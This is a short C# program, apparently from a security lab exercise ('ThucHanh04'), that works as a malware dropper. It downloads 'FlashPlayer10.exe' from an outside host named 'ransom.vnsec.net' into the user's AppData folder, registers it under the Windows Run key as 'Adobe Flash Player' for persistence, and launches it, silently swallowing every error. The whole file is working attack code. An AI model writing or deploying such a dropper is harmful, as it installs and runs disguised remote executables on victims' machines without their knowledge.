using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace ThucHanh04;

internal class Program
{
	private static void b()
	{
		try
		{
			string text = "http://ransom.vnsec.net/";
			string text2 = "FlashPlayer10.exe";
			string text3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\";
			string address = text + text2;
			string text4 = text3 + text2;
			if (File.Exists(text4))
			{
				File.Delete(text4);
			}
			using WebClient webClient = new WebClient();
			webClient.DownloadFile(address, text4);
		}
		catch
		{
		}
	}

	private static void c()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString();
			string text2 = "FlashPlayer10.exe";
			string text3 = text + "\\" + text2;
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Adobe Flash Player", text3);
			Process.Start(text3);
		}
		catch
		{
		}
	}

	private static void Main(string[] args)
	{
		b();
		c();
	}
}
